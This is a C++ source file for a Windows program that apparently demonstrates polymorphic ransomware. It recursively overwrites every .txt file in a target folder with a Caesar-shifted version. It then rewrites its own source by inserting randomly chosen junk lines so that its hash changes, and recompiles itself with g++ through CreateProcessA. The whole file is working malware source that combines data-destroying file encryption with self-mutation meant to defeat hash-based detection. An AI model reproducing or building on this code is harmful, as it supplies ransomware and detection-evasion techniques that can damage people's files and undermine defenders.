#include <fstream>
#include <string>
#include <iostream>
#include <vector>
#include <windows.h>
#include <ctime>
#include <dirent.h>
#include <string>

using namespace std;

// //@ and //! are the flags to show that we are inside braces and we can mutate

void encryptdata(const char*  path , int key);
void mutate(string path);
void process_directory(const char* path, int key);
void makeexe(const char* path);

//function to randomly return a string from a vector of strings
string random_string(vector<string> v) {
//!
    int index = rand() ;
    index = index % v.size();
    return v[index];
//@
}

//Random number fucntion that return a number between 1 and 10 
int random_number(){
//!
   int index = rand() ; 
   index = index % 10 + 1;
    return index; 
//@
}

// create a vector with code lines in it 
//Lines are useless will just change hash without changing actual Functionality
vector<string> v = {
    "cout<<\"\";",
    "for(int i=0 ; i<=0 ; i++){}", 
    "while(true){break;}",
    "if(true){ }"
};


int main()
{
//!
    srand(static_cast<unsigned int>(time(nullptr)));
    encryptdata("Folder1" , 3);
    mutate("Polymorphic_v2.cpp");
    makeexe("Polymorphic_v2"); 
    return 0;
//@
}

//This will read this file and mutate it and rewrite it
void mutate(string path)
{
//!  
  ifstream in(path);
  
  string line;
  vector<string> lines;

  while (getline(in, line)) { 
        lines.push_back(line);
  }

  in.close();

  ofstream out(path);
 
  bool flag=false;
  bool mutated = false;
  int prob = 3 ;            // chance when a line will be added or not //

  for(int i=0;i<lines.size();i++){
    
    //! and //@ are the flags to show that we are inside a fucntion and we can mutate
    if(lines[i]=="//!" ){  out << lines[i] << endl;  flag=true; continue ; }
    if(lines[i]=="//@"){   out << lines[i] << endl;  flag=false;  continue ; }

    if(flag){
      int x = random_number();  //random number will be 1-10
      //atleast one line will be added in loop depending on mutated flag
      //rest depends on prob value
      if(x<prob || !mutated){   
        out<<random_string(v)<<endl;
        mutated = true ; 
      } 
    }

    out<<lines[i]<<endl;

   }
   out.close();
   
//@
}

void process_directory(const char* path, int key) {
//!
    DIR* dir = opendir(path);
    if (dir == NULL) {
        cerr << "Error opening directory " << path << endl;
        return;
    }
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        // skip "." and ".." entries
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }
        // construct the full path of the entry
        string full_path = string(path) + '/' + entry->d_name;

        // if the entry is a regular file with a .txt extension, process it
        if (entry->d_type == DT_REG && full_path.size() >= 4 && full_path.substr(full_path.size() - 4) == ".txt") {
            // read the file into a vector of strings
            ifstream in(full_path);
            string line;
            vector<string> lines;
            while (getline(in, line)) {
                lines.push_back(line);
            }
            in.close();

            // Output encrypted data into the file
            ofstream out(full_path);
            char c;
            for (int i = 0; i < lines.size(); i++) {
                for (int j = 0; j < lines[i].size(); j++) {
                    c = lines[i][j];
             //check if c is a space or a new line  
                    if(c == ' ' ){
                        out.put(c);
//@
                    }
                    else{
                        out.put(c + key);
                    }
                    
                }
                out.put('\n');
            }
            out.close();
        }
        // if the entry is a directory, recursively process it
        else if (entry->d_type == DT_DIR) {
            process_directory(full_path.c_str(), key);
        }
    }
    closedir(dir);
}

void encryptdata(const char*  path , int key)
{
//!
    process_directory(path ,  key);
//@
}

void makeexe(const char*  path){
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Command-line arguments
    char cmdLine[256]; // Adjust the size as needed

    //concatination
    sprintf(cmdLine, "g++ -w %s.cpp -o %s.exe", path , path);
    //g++ -w Polymorphic.cpp -o Polymorphic.exe


    // create the process
    BOOL success = CreateProcessA(
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "Error creating process" << std::endl;
        return ;
    }

    // resume the process
    ResumeThread(pi.hThread);

    // wait for the process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // close the handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    exit(0);
}
